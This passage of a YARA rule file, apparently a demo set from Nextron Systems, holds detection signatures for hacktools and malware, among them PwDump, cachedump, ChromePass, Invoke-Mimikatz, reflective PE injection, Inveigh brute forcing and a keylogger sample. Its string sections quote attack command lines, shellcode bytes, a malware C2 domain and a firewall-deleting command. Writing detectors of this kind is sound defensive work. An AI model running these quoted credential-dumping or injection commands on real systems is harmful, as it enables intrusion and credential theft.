fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) ) or ( 3 of them )\n}\n\nrule lsremora_RID2A76 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects a tool used by APT groups\"\n      author = \"Florian Roth\"\n      reference = \"https://community.broadcom.com/home\"\n      date = \"2016-09-08 06:08:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"efa66f6391ec471ca52cd053159c8a8778f11f921da14e6daf76387f8c9afcd5\"\n      hash2 = \"e0327c1218fd3723e20acc780e20135f41abca35c35e0f97f7eccac265f4f44e\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Target: Failed to load primary SAM functions.\" fullword ascii\n      $x2 = \"lsremora_RID2A7664.dll\" fullword ascii\n      $x3 = \"PwDumpError:999999\" fullword wide\n      $x4 = \"PwDumpError\" fullword wide\n      $x5 = \"lsremora_RID2A76.dll\" fullword ascii\n      $s1 = \":\\\\\\\\.\\\\pipe\\\\%s\" fullword ascii\n      $s2 = \"x%s_history_%d:%d\" fullword wide\n      $s3 = \"Using pipe %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) ) or ( 3 of them )\n}\n\nrule servpw_RID29B8 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects a tool used by APT groups - file servpw_RID29B8.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://community.broadcom.com/home\"\n      date = \"2016-09-08 00:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"97b39ac28794a7610ed83ad65e28c605397ea7be878109c35228c126d43e2f46\"\n      hash2 = \"0f340b471ef34c69f5413540acd3095c829ffc4df38764e703345eb5e5020301\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Unable to open target process: %d, pid %d\" fullword ascii\n      $s2 = \"LSASS.EXE\" fullword wide\n      $s3 = \"WriteProcessMemory failed: %d\" fullword ascii\n      $s4 = \"lsremora64.dll\" fullword ascii\n      $s5 = \"CreateRemoteThread failed: %d\" fullword ascii\n      $s6 = \"Thread code: %d, path: %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them ) or ( all of them )\n}\n\nrule fgexec_RID2983 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects a tool used by APT groups - file fgexec_RID2983.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://community.broadcom.com/home\"\n      date = \"2016-09-08 23:23:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"8697897bee415f213ce7bc24f22c14002d660b8aaffab807490ddbf4f3f20249\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\fgexec_RID2983.pdb\" ascii\n      $x2 = \"fgexec_RID2983 Remote Process Execution Tool\" fullword ascii\n      $x3 = \"fgexec_RID2983 CallNamedPipe failed\" fullword ascii\n      $x4 = \"fizzgig and the mighty foofus.net team\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of ( $x* ) ) or ( 3 of them )\n}\n\nrule cachedump_RID2ABB : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects a tool used by APT groups - from files cachedump_RID2ABB.exe, cachedump_RID2ABB64.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://community.broadcom.com/home\"\n      date = \"2016-09-08 08:03:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"cf58ca5bf8c4f87bb67e6a4e1fb9e8bada50157dacbd08a92a4a779e40d569c4\"\n      hash2 = \"e38edac8c838a043d0d9d28c71a96fe8f7b7f61c5edf69f1ce0c13e141be281f\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Failed to open key SECURITY\\\\Cache in RegOpenKeyEx. Is service running as SYSTEM ? Do you ever log on domain ? \" fullword ascii\n      $s2 = \"Unable to open LSASS.EXE process\" fullword ascii\n      $s3 = \"Service not found. Installing CacheDump Service (%s)\" fullword ascii\n      $s4 = \"CacheDump service successfully installed.\" fullword ascii\n      $s5 = \"Kill CacheDump service (shouldn't be used)\" fullword ascii\n      $s6 = \"cacheDump [-v | -vv | -K]\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of them ) or ( 3 of them )\n}\n\nrule PwDump_B_RID2A0F : DEMO EXE FILE HKTL T1003 {\n   meta:\n      description = \"Detects a tool used by APT groups - file PwDump.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://community.broadcom.com/home\"\n      date = \"2016-09-08 03:16:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"3c796092f42a948018c3954f837b4047899105845019fce75a6e82bc99317982\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineName\" fullword ascii\n      $x2 = \"pwdump6 Version %s by fizzgig and the mighty group at foofus.net\" fullword ascii\n      $x3 = \"where -x targets a 64-bit host\" fullword ascii\n      $x4 = \"Couldn't delete target executable from remote machine: %d\" fullword ascii\n      $s1 = \"lsremora64.dll\" fullword ascii\n      $s2 = \"lsremora.dll\" fullword ascii\n      $s3 = \"servpw.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of ( $x* ) ) or ( 3 of them )\n}\n\nrule HKTL_RemoteCmd_Sep16_RID2E11 : DEMO EXE FILE HKTL T1569_002 {\n   meta:\n      description = \"Detects a remote access tool used by APT groups - file RemoteCmd.exe\"\n      author = \"Florian Roth (Nextron Systems)\"\n      reference = \"http://goo.gl/igxLyF\"\n      date = \"2016-09-08 10:58:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"5264d1de687432f8346617ac88ffcb31e025e43fc3da1dad55882b17b44f1f8b\"\n      id = \"384f37f3-4562-5d79-9793-0384c43d4602\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1569_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"RemoteCmd.exe\" fullword wide\n      $s2 = \"\\\\Release\\\\RemoteCmd.pdb\" ascii\n      $s3 = \"RemoteCmd [ComputerName] [Executable] [Param1] [Param2] ...\" fullword wide\n      $s4 = \"http://{0}:65101/CommandEngine\" fullword wide\n      $s5 = \"Brenner.RemoteCmd.Client\" fullword ascii\n      $s6 = \"$b1888995-1ee5-4f6d-82df-d2ab8ae73d63\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 2 of them ) or ( 4 of them )\n}\n\nrule HKTL_ChromePass_Sep16_RID2E86 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects a tool used by APT groups - file ChromePass.exe\"\n      author = \"Florian Roth (Nextron Systems)\"\n      reference = \"http://goo.gl/igxLyF\"\n      date = \"2016-09-08 11:18:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2025-03-10\"\n      hash1 = \"5ff43049ae18d03dcc74f2be4a870c7056f6cfb5eb636734cca225140029de9a\"\n      id = \"950b9761-bdfd-514b-90ea-a1454d35ce5a\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\ChromePass.pdb\" ascii\n      $x2 = \"Windows Protect folder for getting the encryption keys\" wide\n      $x3 = \"Chrome User Data folder where the password file is stored\" wide\n      $s1 = \"Opera Software\\\\Opera Stable\\\\Login Data\" fullword wide\n      $s2 = \"Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Login Data\" fullword wide\n      $s3 = \"Load the passwords from another Windows user or external drive: \" fullword wide\n      $s4 = \"Windows Login Password:\" fullword wide\n      $s5 = \"SELECT origin_url, action_url, username_element, username_value, password_element, password_value, signon_realm, date_created fr\" ascii\n      $s6 = \"Chrome Password Recovery\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of ( $x* ) ) or ( 5 of them )\n}\n\nrule HKTL_Buckeye_Osinfo_Sep16_RID3026 : DEMO EXE FILE G0022 HKTL {\n   meta:\n      description = \"Detects OSinfo tool used by the Buckeye APT group\"\n      author = \"Florian Roth (Nextron Systems)\"\n      reference = \"http://www.symantec.com/connect/blogs/buckeye-cyberespionage-group-shifts-gaze-us-hong-kong\"\n      date = \"2016-09-05 12:27:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      id = \"e40a86d1-fd1a-5430-b7b7-8cc7ca128cc5\"\n      tags = \"DEMO, EXE, FILE, G0022, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-s ShareInfo ShareDir\" fullword ascii\n      $s2 = \"-a Local And Global Group User Info\" fullword ascii\n      $s3 = \"-f <infile> //input server list from infile, OneServerOneLine\" fullword ascii\n      $s4 = \"info <\\\\server> <user>\" fullword ascii\n      $s5 = \"-c Connect Test\" fullword ascii\n      $s6 = \"-gd Group Domain Admins\" fullword ascii\n      $s7 = \"-n NetuseInfo\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and 3 of ( $s* )\n}\n\nrule ps1_toolkit_PowerUp_RID2EBB : DEMO FILE HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file PowerUp.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 11:27:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fc65ec85dbcd49001e6037de9134086dd5559ac41ac4d1adf7cab319546758ad\"\n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"iex \\\"$Env:SystemRoot\\\\System32\\\\inetsrv\\\\appcmd.exe list vdir /text:vdir.name\\\" | % { \" fullword ascii\n      $s2 = \"iex \\\"$Env:SystemRoot\\\\System32\\\\inetsrv\\\\appcmd.exe list apppools /text:name\\\" | % { \" fullword ascii\n      $s3 = \"if ($Env:PROCESSOR_ARCHITECTURE -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBNAEQANgA0AA==')))) {\" fullword ascii\n      $s4 = \"C:\\\\Windows\\\\System32\\\\InetSRV\\\\appcmd.exe list vdir /text:physicalpath | \" fullword ascii\n      $s5 = \"if (Test-Path  (\\\"$Env:SystemRoot\\\\System32\\\\inetsrv\\\\appcmd.exe\\\"))\" fullword ascii\n      $s6 = \"if (Test-Path  (\\\"$Env:SystemRoot\\\\System32\\\\InetSRV\\\\appcmd.exe\\\")) {\" fullword ascii\n      $s7 = \"Write-Verbose \\\"Executing command '$Cmd'\\\"\" fullword ascii\n      $s8 = \"Write-Warning \\\"[!] Target service\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 4000KB and 1 of them ) or ( 3 of them )\n}\n\nrule ps1_toolkit_Inveigh_BruteForce_RID3303 : DEMO FILE HKTL SCRIPT T1059_001 T1110 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file Inveigh-BruteForce.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 14:29:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a2ae1e02bcb977cd003374f551ed32218dbcba3120124e369cc150b9a63fe3b8\"\n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1059_001, T1110\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Import-Module .\\\\Inveigh.psd1;Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 \" fullword ascii\n      $s2 = \"$(Get-Date -format 's') - Attempting to stop HTTP listener\\\")|Out-Null\" fullword ascii\n      $s3 = \"Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 -Hostname server1\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 300KB and 1 of them ) or ( 2 of them )\n}\n\nrule ps1_toolkit_Invoke_Shellcode_RID3247 : DEMO FILE HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file Invoke-Shellcode.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 13:58:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"24abe9f3f366a3d269f8681be80c99504dea51e50318d83ee42f9a4c7435999a\"\n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Get-ProcAddress kernel32.dll WriteProcessMemory\" fullword ascii\n      $s2 = \"Get-ProcAddress kernel32.dll OpenProcess\" fullword ascii\n      $s3 = \"msfpayload windows/exec CMD=\\\"cmd /k calc\\\" EXITFUNC=thread C | sed '1,6d;s/[\\\";]//g;s/\\\\\\\\/,0/g' | tr -d '\\\\n' | cut -c2- \" fullword ascii\n      $s4 = \"inject shellcode into\" ascii\n      $s5 = \"Injecting shellcode\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 90KB and 1 of them ) or ( 3 of them )\n}\n\nrule ps1_toolkit_Invoke_Mimikatz_RID31FA : DEMO FILE HKTL S0002 SCRIPT T1003 T1059_001 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file Invoke-Mimikatz.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 13:45:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5c31a2e3887662467cfcb0ac37e681f1d9b0f135e6dfff010aae26587e03d8c8\"\n      tags = \"DEMO, FILE, HKTL, S0002, SCRIPT, T1003, T1059_001, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Get-ProcAddress kernel32.dll WriteProcessMemory\" fullword ascii\n      $s2 = \"ps | where { $_.Name -eq $ProcName } | select ProcessName, Id, SessionId\" fullword ascii\n      $s3 = \"privilege::debug exit\" ascii\n      $s4 = \"Get-ProcAddress Advapi32.dll AdjustTokenPrivileges\" fullword ascii\n      $s5 = \"Invoke-Mimikatz -DumpCreds\" fullword ascii\n      $s6 = \"| Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 10000KB and 1 of them ) or ( 3 of them )\n}\n\nrule ps1_toolkit_Invoke_RelfectivePEInjection_RID36F5 : DEMO FILE HKTL SCRIPT T1055_002 T1059_001 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file Invoke-RelfectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 17:18:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"510b345f821f93c1df5f90ac89ad91fcd0f287ebdabec6c662b716ec9fddb03a\"\n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1055_002, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)\" fullword ascii\n      $x2 = \"Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local\" fullword ascii\n      $x3 = \"} = Get-ProcAddress Advapi32.dll OpenThreadToken\" ascii\n      $x4 = \"Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local\" fullword ascii\n      $s5 = \"$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')\" fullword ascii\n      $s6 = \"= Get-ProcAddress Advapi32.dll AdjustTokenPrivileges\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 700KB and 2 of them ) or ( all of them )\n}\n\nrule ps1_toolkit_Persistence_RID306E : DEMO FILE HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file Persistence.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 12:39:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e1a4dd18b481471fc25adea6a91982b7ffed1c2d393c8c17e6e542c030ac6cbd\"\n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\"`\\\"```$Filter=Set-WmiInstance -Class __EventFilter -Namespace ```\\\"root\\\\subscription```\" ascii\n      $s2 = \"}=$PROFILE.AllUsersAllHosts;${\" ascii\n      $s3 = \"C:\\\\PS> $ElevatedOptions = New-ElevatedPersistenceOption -Registry -AtStartup\" ascii\n      $s4 = \"= gwmi Win32_OperatingSystem | select -ExpandProperty OSArchitecture\" ascii\n      $s5 = \"-eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAxADQAQwA='))))\" ascii\n      $s6 = \"}=$PROFILE.CurrentUserAllHosts;${\" ascii\n      $s7 = \"FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBPAG4ASQBkAGwAZQA=')\" ascii\n      $s8 = \"[System.Text.AsciiEncoding]::ASCII.GetString($MZHeader)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )\n}\n\nrule ps1_toolkit_Invoke_Mimikatz_RelfectivePEInjection_RID3A9A : DEMO FILE HKTL S0002 SCRIPT T1003 T1059_001 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - from files Invoke-Mimikatz.ps1, Invoke-RelfectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 19:53:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5c31a2e3887662467cfcb0ac37e681f1d9b0f135e6dfff010aae26587e03d8c8\"\n      hash2 = \"510b345f821f93c1df5f90ac89ad91fcd0f287ebdabec6c662b716ec9fddb03a\"\n      tags = \"DEMO, FILE, HKTL, S0002, SCRIPT, T1003, T1059_001, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])\" fullword ascii\n      $s2 = \"if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)\" fullword ascii\n      $s3 = \"[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)\" fullword ascii\n      $s4 = \"Function Import-DllInRemoteProcess\" fullword ascii\n      $s5 = \"FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))\" fullword ascii\n      $s6 = \"[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)\" fullword ascii\n      $s7 = \"[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)\" fullword ascii\n      $s8 = \"[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null\" fullword ascii\n      $s9 = \"::FromBase64String('RABvAG4AZQAhAA==')))\" ascii\n      $s10 = \"Write-Verbose \\\"PowerShell ProcessID: $PID\\\"\" fullword ascii\n      $s11 = \"[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 10000KB and 3 of them ) or ( 6 of them )\n}\n\nrule ps1_toolkit_Inveigh_BruteForce_2_RID3394 : DEMO FILE HKTL SCRIPT T1059_001 T1110 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - from files Inveigh-BruteForce.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 14:53:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a2ae1e02bcb977cd003374f551ed32218dbcba3120124e369cc150b9a63fe3b8\"\n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1059_001, T1110\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"}.NTLMv2_file_queue[0]|Out-File ${\" ascii\n      $s2 = \"}.NTLMv2_file_queue.RemoveRange(0,1)\" ascii\n      $s3 = \"}.NTLMv2_file_queue.Count -gt 0)\" ascii\n      $s4 = \"}.relay_running = $false\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )\n}\n\nrule ps1_toolkit_PowerUp_2_RID2F4C : DEMO FILE HKTL SCRIPT T1059_001 T1087_001 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - from files PowerUp.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 11:51:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fc65ec85dbcd49001e6037de9134086dd5559ac41ac4d1adf7cab319546758ad\"\n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1059_001, T1087_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if($MyConString -like $([Text.Encoding]::Unicode.GetString([Convert]::\" ascii\n      $s2 = \"FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA=')))) {\" ascii\n      $s3 = \"$Null = Invoke-ServiceStart\" ascii\n      $s4 = \"Write-Warning \\\"[!] Access to service $\" ascii\n      $s5 = \"} = $MyConString.Split(\\\"=\\\")[1].Split(\\\";\\\")[0]\" ascii\n      $s6 = \"} += \\\"net localgroup ${\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 2000KB and 2 of them ) or ( 4 of them )\n}\n\nrule ps1_toolkit_Persistence_2_RID30FF : DEMO FILE HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - from files Persistence.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 13:03:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e1a4dd18b481471fc25adea6a91982b7ffed1c2d393c8c17e6e542c030ac6cbd\"\n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBPAG4ASQBkAGwAZQA=')\" ascii\n      $s2 = \"FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBEAGEAaQBsAHkA')\" ascii\n      $s3 = \"FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA==')\" ascii\n      $s4 = \"[Parameter( ParameterSetName = 'ScheduledTaskAtLogon', Mandatory = $True )]\" ascii\n      $s5 = \"FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBBAHQATABvAGcAbwBuAA==')))\" ascii\n      $s6 = \"[Parameter( ParameterSetName = 'PermanentWMIAtStartup', Mandatory = $True )]\" fullword ascii\n      $s7 = \"FromBase64String('TQBlAHQAaABvAGQA')\" ascii\n      $s8 = \"FromBase64String('VAByAGkAZwBnAGUAcgA=')\" ascii\n      $s9 = \"[Runtime.InteropServices.CallingConvention]::Winapi,\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )\n}\n\nrule ps1_toolkit_Inveigh_BruteForce_3_RID3395 : DEMO FILE HKTL SCRIPT T1059_001 T1110 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - from files Inveigh-BruteForce.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 14:54:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash3 = \"a2ae1e02bcb977cd003374f551ed32218dbcba3120124e369cc150b9a63fe3b8\"\n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1059_001, T1110\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"::FromBase64String('TgBUAEwATQA=')\" ascii\n      $s2 = \"::FromBase64String('KgBTAE0AQgAgAHIAZQBsAGEAeQAgACoA')))\" ascii\n      $s3 = \"::FromBase64String('KgAgAGYAbwByACAAcgBlAGwAYQB5ACAAKgA=')))\" ascii\n      $s4 = \"::FromBase64String('KgAgAHcAcgBpAHQAdABlAG4AIAB0AG8AIAAqAA==')))\" ascii\n      $s5 = \"[Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`\" fullword ascii\n      $s6 = \"KgAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIAAqAA\" ascii\n      $s7 = \"}.bruteforce_running)\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )\n}\n\nrule Malware_QA_not_copy_RID2E95 : DEMO EXE FILE MAL {\n   meta:\n      description = \"VT Research QA uploaded malware - file not copy.exe\"\n      author = \"Florian Roth\"\n      reference = \"VT Research QA\"\n      date = \"2016-08-29 11:20:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1410f38498567b64a4b984c69fe4f2859421e4ac598b9750d8f703f1d209f836\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"U2VydmVyLmV4ZQ==\" fullword wide\n      $x2 = \"\\\\not copy\\\\obj\\\\Debug\\\\not copy.pdb\" ascii\n      $x3 = \"fuckyou888.ddns.net\" fullword wide\n      $s1 = \"cmd.exe /c ping 0 -n 2 & del \\\"\" fullword wide\n      $s2 = \"Server.exe\" fullword wide\n      $s3 = \"Execute ERROR\" fullword wide\n      $s4 = \"not copy.exe\" fullword wide\n      $s5 = \"Non HosT\" fullword wide\n      $s6 = \"netsh firewall delete allowedprogram\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 4 of ( $s* ) ) ) or ( 5 of them )\n}\n\nrule Malware_QA_update_RID2DAD : DEMO EXE FILE MAL {\n   meta:\n      description = \"VT Research QA uploaded malware - file update.exe\"\n      author = \"Florian Roth\"\n      reference = \"VT Research QA\"\n      date = \"2016-08-29 10:42:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6d805533623d7063241620eec38b7eb9b625533ccadeaf4f6c2cc6db32711541\"\n      hash2 = \"6415b45f5bae6429dd5d92d6cae46e8a704873b7090853e68e80cd179058903e\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"UnActiveOfflineKeylogger\" fullword ascii\n      $x2 = \"BTRESULTDownload File|Mass Download : File Downloaded , Executing new one in temp dir...|\" fullword ascii\n      $x3 = \"ActiveOnlineKeylogger\" fullword ascii\n      $x4 = \"C:\\\\Users\\\\DarkCoderSc\\\\\" ascii\n      $x5 = \"Celesty Binder\\\\Stub\\\\STATIC\\\\Stub.pdb\" ascii\n      $x6 = \"BTRESULTUpdate from 